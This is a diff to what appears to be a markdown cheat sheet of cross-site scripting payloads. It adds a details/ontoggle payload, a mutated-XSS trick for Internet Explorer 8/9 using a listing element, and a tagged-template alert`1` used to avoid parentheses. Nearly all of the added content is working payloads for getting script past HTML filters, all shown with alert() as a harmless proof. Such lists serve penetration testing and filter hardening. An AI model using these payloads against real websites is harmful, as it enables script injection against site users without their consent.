@@ -53,6 +53,7 @@ XSS for HTML5
 <video/poster/onerror=alert(1)>
 <video><source onerror="javascript:alert(1)">
 <video src=_ onloadstart="alert(1)">
+<details/open/ontoggle="alert`1`"
 ```
 
 
@@ -130,6 +131,14 @@ XSS in SVG (short)
 more payloads in ./files
 
 
+# Mutated XSS for Browser IE8/IE9
+```
+<listing id=x>&lt;img src=1 onerror=alert(1)&gt;</listing>
+<script>alert(document.getElementById('x').innerHTML)</script>
+```
+ IE will read and write (decode) HTML multiple time and attackers XSS payload will mutate and execute. 
+
+
 ## Polyglot XSS
 Polyglot XSS - 0xsobky
 ```
@@ -159,6 +168,10 @@ Bypass quotes for string
 String.fromCharCode(88,83,83)
 ```
 
+Bypass parenthesis for string
+```
+alert`1`
+```
 
 ```
 <script>$=1,alert($)</script>
